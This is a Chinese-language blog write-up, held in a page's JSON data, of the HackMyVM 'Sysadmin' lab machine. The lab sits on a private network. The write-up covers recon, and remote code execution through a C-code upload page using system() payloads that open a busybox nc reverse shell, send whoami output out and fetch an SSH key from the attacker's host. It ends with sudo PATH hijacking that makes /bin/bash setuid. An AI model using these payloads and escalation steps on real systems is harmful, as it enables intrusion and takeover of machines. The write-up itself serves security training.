{"pageProps":{"postData":{"id":"HackMyVMSysadmin","contentHtml":"<h1>Sysadmin.</h1>\n<blockquote>\n<p><a href=\"https://hackmyvm.eu/machines/machine.php?vm=Sysadmin\">https://hackmyvm.eu/machines/machine.php?vm=Sysadmin</a></p>\n</blockquote>\n<p><img src=\"/post-images/HackMyVMSysadmin/image.png\" alt=\"image.png\"></p>\n<h2>Recon</h2>\n<h3>PortScan</h3>\n<pre><code class=\"hljs language-python\">➜  ~ nmap -sT -<span class=\"hljs-built_in\">min</span>-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.210</span>\nStarting Nmap <span class=\"hljs-number\">7.95</span> ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-<span class=\"hljs-number\">10</span>-<span class=\"hljs-number\">25</span> <span class=\"hljs-number\">15</span>:08 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.210</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00015</span>s latency).\nNot shown: <span class=\"hljs-number\">65533</span> closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp <span class=\"hljs-built_in\">open</span>  ssh\n<span class=\"hljs-number\">80</span>/tcp <span class=\"hljs-built_in\">open</span>  http\nMAC Address: 08:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">43</span>:E8:<span class=\"hljs-number\">73</span> (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: <span class=\"hljs-number\">1</span> IP address (<span class=\"hljs-number\">1</span> host up) scanned <span class=\"hljs-keyword\">in</span> <span class=\"hljs-number\">17.45</span> seconds\n</code></pre>\n<pre><code class=\"hljs language-python\">➜  ~ nmap -sT -A -p <span class=\"hljs-number\">22</span>,<span class=\"hljs-number\">80</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.210</span>        \nStarting Nmap <span class=\"hljs-number\">7.95</span> ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-<span class=\"hljs-number\">10</span>-<span class=\"hljs-number\">25</span> <span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">14</span> CST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.210</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00049</span>s latency).\n\nPORT   STATE SERVICE VERSION\n<span class=\"hljs-number\">22</span>/tcp <span class=\"hljs-built_in\">open</span>  ssh     OpenSSH <span class=\"hljs-number\">8.4</span>p1 Debian <span class=\"hljs-number\">5</span>+deb11u3 (protocol <span class=\"hljs-number\">2.0</span>)\n| ssh-hostkey: \n|   <span class=\"hljs-number\">3072</span> f6:a3:b6:<span class=\"hljs-number\">78</span>:c4:<span class=\"hljs-number\">62</span>:af:<span class=\"hljs-number\">44</span>:bb:1a:a0:0c:08:6b:<span class=\"hljs-number\">98</span>:f7 (RSA)\n|   <span class=\"hljs-number\">256</span> bb:e8:a2:<span class=\"hljs-number\">31</span>:d4:05:a9:c9:<span class=\"hljs-number\">31</span>:ff:<span class=\"hljs-number\">62</span>:f6:<span class=\"hljs-number\">32</span>:<span class=\"hljs-number\">84</span>:<span class=\"hljs-number\">21</span>:9d (ECDSA)\n|_  <span class=\"hljs-number\">256</span> 3b:ae:<span class=\"hljs-number\">34</span>:<span class=\"hljs-number\">64</span>:4f:a5:<span class=\"hljs-number\">75</span>:b9:4a:b9:<span class=\"hljs-number\">81</span>:f9:<span class=\"hljs-number\">89</span>:<span class=\"hljs-number\">76</span>:<span class=\"hljs-number\">99</span>:eb (ED25519)\n<span class=\"hljs-number\">80</span>/tcp <span class=\"hljs-built_in\">open</span>  http    Apache httpd <span class=\"hljs-number\">2.4</span><span class=\"hljs-number\">.62</span> ((Debian))\n|_http-title: C Code Upload\n|_http-server-header: Apache/<span class=\"hljs-number\">2.4</span><span class=\"hljs-number\">.62</span> (Debian)\nMAC Address: 08:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">43</span>:E8:<span class=\"hljs-number\">73</span> (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could <span class=\"hljs-keyword\">not</span> find at least <span class=\"hljs-number\">1</span> <span class=\"hljs-built_in\">open</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span> closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose|router\nRunning: Linux <span class=\"hljs-number\">4.</span>X|<span class=\"hljs-number\">5.</span>X, MikroTik RouterOS <span class=\"hljs-number\">7.</span>X\nOS CPE: cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">4</span> cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">5</span> cpe:/o:mikrotik:routeros:<span class=\"hljs-number\">7</span> cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">5.6</span><span class=\"hljs-number\">.3</span>\nOS details: Linux <span class=\"hljs-number\">4.15</span> - <span class=\"hljs-number\">5.19</span>, OpenWrt <span class=\"hljs-number\">21.02</span> (Linux <span class=\"hljs-number\">5.4</span>), MikroTik RouterOS <span class=\"hljs-number\">7.2</span> - <span class=\"hljs-number\">7.5</span> (Linux <span class=\"hljs-number\">5.6</span><span class=\"hljs-number\">.3</span>)\nNetwork Distance: <span class=\"hljs-number\">1</span> hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n<span class=\"hljs-number\">1</span>   <span class=\"hljs-number\">0.50</span> ms <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.210</span>\n\nOS <span class=\"hljs-keyword\">and</span> Service detection performed. Please report <span class=\"hljs-built_in\">any</span> incorrect results at https://nmap.org/submit/ .\nNmap done: <span class=\"hljs-number\">1</span> IP address (<span class=\"hljs-number\">1</span> host up) scanned <span class=\"hljs-keyword\">in</span> <span class=\"hljs-number\">21.64</span> seconds\n</code></pre>\n<h3>枚举</h3>\n<p><code>80</code> 端口，看样子是文件上传，并且是让我们上传 <code>C</code> 语言文件，并且会运行</p>\n<p><img src=\"/post-images/HackMyVMSysadmin/image1.png\" alt=\"image.png\"></p>\n<p>端口扫描</p>\n<pre><code class=\"hljs language-python\">➜  sysadmin feroxbuster --url http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.210</span> -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-<span class=\"hljs-built_in\">list</span>-<span class=\"hljs-number\">2.3</span>-medium.txt --<span class=\"hljs-built_in\">filter</span>-status <span class=\"hljs-number\">404</span>,<span class=\"hljs-number\">503</span>,<span class=\"hljs-number\">400</span> -x php,txt\n\n                                                                                                                                    \n ___  ___  __   __     __      __         __   ___\n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__\n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___\nby Ben <span class=\"hljs-string\">\"epi\"</span> Risher 🤓                 ver: <span class=\"hljs-number\">2.11</span><span class=\"hljs-number\">.0</span>\n───────────────────────────┬──────────────────────\n 🎯  Target Url            │ http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.210</span>\n 🚀  Threads               │ <span class=\"hljs-number\">50</span>\n 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-<span class=\"hljs-built_in\">list</span>-<span class=\"hljs-number\">2.3</span>-medium.txt\n 💢  Status Code Filters   │ [<span class=\"hljs-number\">404</span>, <span class=\"hljs-number\">503</span>, <span class=\"hljs-number\">400</span>]\n 💥  Timeout (secs)        │ <span class=\"hljs-number\">7</span>\n 🦡  User-Agent            │ feroxbuster/<span class=\"hljs-number\">2.11</span><span class=\"hljs-number\">.0</span>\n 💉  Config File           │ /etc/feroxbuster/ferox-config.toml\n 🔎  Extract Links         │ true\n 💲  Extensions            │ [php, txt]\n 🏁  HTTP methods          │ [GET]\n 🔃  Recursion Depth       │ <span class=\"hljs-number\">4</span>\n───────────────────────────┴──────────────────────\n 🏁  Press [ENTER] to use the Scan Management Menu™\n──────────────────────────────────────────────────\n<span class=\"hljs-number\">404</span>      GET        <span class=\"hljs-number\">9l</span>       31w      276c Auto-filtering found <span class=\"hljs-number\">404</span>-like response <span class=\"hljs-keyword\">and</span> created new <span class=\"hljs-built_in\">filter</span>; toggle off <span class=\"hljs-keyword\">with</span> --dont-<span class=\"hljs-built_in\">filter</span>\n<span class=\"hljs-number\">403</span>      GET        <span class=\"hljs-number\">9l</span>       28w      279c Auto-filtering found <span class=\"hljs-number\">404</span>-like response <span class=\"hljs-keyword\">and</span> created new <span class=\"hljs-built_in\">filter</span>; toggle off <span class=\"hljs-keyword\">with</span> --dont-<span class=\"hljs-built_in\">filter</span>\n<span class=\"hljs-number\">200</span>      GET       <span class=\"hljs-number\">59l</span>      156w     2384c http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.210</span>/index.php\n<span class=\"hljs-number\">200</span>      GET       <span class=\"hljs-number\">59l</span>      156w     2384c http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.210</span>/\n[<span class=\"hljs-comment\">####################] - 50s   661641/661641  0s      found:2       errors:1      </span>\n[<span class=\"hljs-comment\">####################] - 50s   661635/661635  13173/s http://192.168.56.210/</span>\n</code></pre>\n<p>F12 查看源码时发现</p>\n<pre><code class=\"hljs language-python\">gcc -std=c11 -nostdinc -I/var/www/include -z execstack -fno-stack-protector -no-pie test.c -o a.out\n</code></pre>\n<p><img src=\"/post-images/HackMyVMSysadmin/image2.png\" alt=\"image.png\"></p>\n<h2>RCE</h2>\n<p>这里的猜测是，上传 c 文件后，然后通过上边的语句进行编译然后运行，但是编译语句中带有 <code>-nostdinc</code> 不使用默认系统库函数及不搜索默认头文件路径，所以我们无法直接导入 <code>stdio.h</code> 等，需要绕过</p>\n<p>通过使用内联函数定义，要在不依赖 <code>stdlib.h</code> 的情况下调用 system，您可以手动声明它：</p>\n<p>测试一下是否存在RCE</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-built_in\">int</span> system(const char *command);\n<span class=\"hljs-built_in\">int</span> main() {\n    system(<span class=\"hljs-string\">\"busybox nc 192.168.56.5 1234\"</span>); // Attempt to spawn a shell\n    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;\n}\n</code></pre>\n<p>存在 RCE</p>\n<p><img src=\"/post-images/HackMyVMSysadmin/image3.png\" alt=\"image.png\"></p>\n<p>进行反弹 <code>shell</code></p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-built_in\">int</span> system(const char *command);\n<span class=\"hljs-built_in\">int</span> main() {\n    system(<span class=\"hljs-string\">\"busybox nc 192.168.56.5 1234 -e /bin/bash\"</span>); // Attempt to spawn a shell\n    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;\n}\n</code></pre>\n<p>但是连上连上不到一会就断掉了</p>\n<p><img src=\"/post-images/HackMyVMSysadmin/image4.png\" alt=\"image.png\"></p>\n<p>尝试写公钥，首先获取用户名</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-built_in\">int</span> system(const char *command);\n<span class=\"hljs-built_in\">int</span> main() {\n    system(<span class=\"hljs-string\">\"echo $(whoami) | busybox nc 192.168.56.5 80\"</span>);\n    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;\n}\n</code></pre>\n<p>得到用户名 <code>echo</code></p>\n<p><img src=\"/post-images/HackMyVMSysadmin/image5.png\" alt=\"image.png\"></p>\n<p>写公钥</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># Kali</span>\ncat ~/.ssh/authorized_keys >  authorized_keys\npython -m http.server <span class=\"hljs-number\">80</span>  \nServing HTTP on <span class=\"hljs-number\">0.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.0</span> port <span class=\"hljs-number\">80</span> (http://<span class=\"hljs-number\">0.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.0</span>:<span class=\"hljs-number\">80</span>/) ...\n</code></pre>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-built_in\">int</span> system(const char *command);\n<span class=\"hljs-built_in\">int</span> main() {\n    system(<span class=\"hljs-string\">\"mkdir -p ~/.ssh &#x26;&#x26; busybox wget 192.168.56.5/authorized_keys -O ~/.ssh/authorized_keys\"</span>);\n    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;\n}\n</code></pre>\n<p><img src=\"/post-images/HackMyVMSysadmin/image6.png\" alt=\"image.png\"></p>\n<p>通过私钥进行登录</p>\n<p><img src=\"/post-images/HackMyVMSysadmin/image7.png\" alt=\"image.png\"></p>\n<p>进去后能读 <code>user.txt</code></p>\n<pre><code class=\"hljs language-python\">echo@Sysadmin:~$ cat user.txt \nflag{user-9592f6e02a7abaf9e38c0ef43e868cf3}\n</code></pre>\n<h2>命令劫持</h2>\n<p>查看 <code>sudo</code> 权限</p>\n<pre><code class=\"hljs language-python\">echo@Sysadmin:~$ sudo -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> echo on Sysadmin:\n    !env_reset, mail_badpass, !env_reset, always_set_home\n\nUser echo may run the following commands on Sysadmin:\n    (root) NOPASSWD: /usr/local/<span class=\"hljs-built_in\">bin</span>/system-info.sh\n</code></pre>\n<p>其中 <code>!env_reset</code> 可能存在路径劫持</p>\n<p>查看脚本</p>\n<pre><code class=\"hljs language-python\">echo@Sysadmin:~$ cat /usr/local/<span class=\"hljs-built_in\">bin</span>/system-info.sh\n<span class=\"hljs-comment\">#!/bin/bash</span>\n\n<span class=\"hljs-comment\">#===================================</span>\n<span class=\"hljs-comment\"># Daily System Info Report</span>\n<span class=\"hljs-comment\">#===================================</span>\n\necho <span class=\"hljs-string\">\"Starting daily system information collection at $(date)\"</span>\necho <span class=\"hljs-string\">\"------------------------------------------------------\"</span>\n\necho <span class=\"hljs-string\">\"Checking disk usage...\"</span>\ndf -h\n\necho <span class=\"hljs-string\">\"Checking log directory...\"</span>\nls -lh /var/log/\nfind /var/log/ -<span class=\"hljs-built_in\">type</span> f -name <span class=\"hljs-string\">\"*.gz\"</span> -mtime +<span class=\"hljs-number\">30</span> -<span class=\"hljs-built_in\">exec</span> rm {} \\;\n\necho <span class=\"hljs-string\">\"Checking critical services...\"</span>\nsystemctl <span class=\"hljs-keyword\">is</span>-active sshd\nsystemctl <span class=\"hljs-keyword\">is</span>-active cron\n\necho <span class=\"hljs-string\">\"Collecting CPU and memory information...\"</span>\ncat /proc/cpuinfo\nfree -m\n\necho <span class=\"hljs-string\">\"------------------------------------------------------\"</span>\necho <span class=\"hljs-string\">\"Report complete at $(date)\"</span>\n</code></pre>\n<p>可以看到很多可以劫持的命令</p>\n<pre><code class=\"hljs language-python\">echo@Sysadmin:~$ echo <span class=\"hljs-string\">\"chmod +s /bin/bash\"</span> > /tmp/df\necho@Sysadmin:~$ chmod +x /tmp/df\necho@Sysadmin:~$ export PATH=<span class=\"hljs-string\">\"/tmp:$PATH\"</span>\necho@Sysadmin:~$ sudo /usr/local/<span class=\"hljs-built_in\">bin</span>/system-info.sh\n</code></pre>\n<p><img src=\"/post-images/HackMyVMSysadmin/image8.png\" alt=\"image.png\"></p>","title":"HackMyVM - Sysadmin","date":"2025-10-25","updated":"2025-10-25","tags":["HackMyVM","Linux","RCE","Hijack","Path_Hijack"],"categories":"靶机","comments":true,"description":"Sysadmin. https://hackmyvm.eu/machines/machine.php?vm=Sysadmin Recon PortScan 枚举 80 端口，看样子是文件上传，并且是让我们上传 C 语言文件，并且会运行 端口扫描 F12 查看源码时发现 RCE 这里的猜测是，上传 c..."},"recentPosts":[{"id":"念念碎","title":"念念碎","date":"2025-10-26","isEncrypted":false,"year":"2025","month":"10","day":"26"},{"id":"HackMyVMSysadmin","title":"HackMyVM - Sysadmin","date":"2025-10-25","isEncrypted":false,"year":"2025","month":"10","day":"25"},{"id":"TheHackersLabsAllSafe","title":"TheHackersLabs - AllSafe","date":"2025-10-21","isEncrypted":false,"year":"2025","month":"10","day":"21"},{"id":"TheHackersLabsLavaShop","title":"TheHackersLabs - LavaShop","date":"2025-10-20","isEncrypted":false,"year":"2025","month":"10","day":"20"},{"id":"HackMyVMBirdeye","title":"HackMyVM - Birdeye","date":"2025-10-17","isEncrypted":false,"year":"2025","month":"10","day":"17"},{"id":"HackTheBoxSeason8 - Signed","title":"HackTheBox - Season9 - Signed","date":"2025-10-14","isEncrypted":true,"year":"2025","month":"10","day":"14"},{"id":"HackTheBoxSeason8 - TombWatcher","title":"HackTheBox - Machine - TombWatcher","date":"2025-06-08","isEncrypted":false,"year":"2025","month":"10","day":"13"}]},"__N_SSG":true}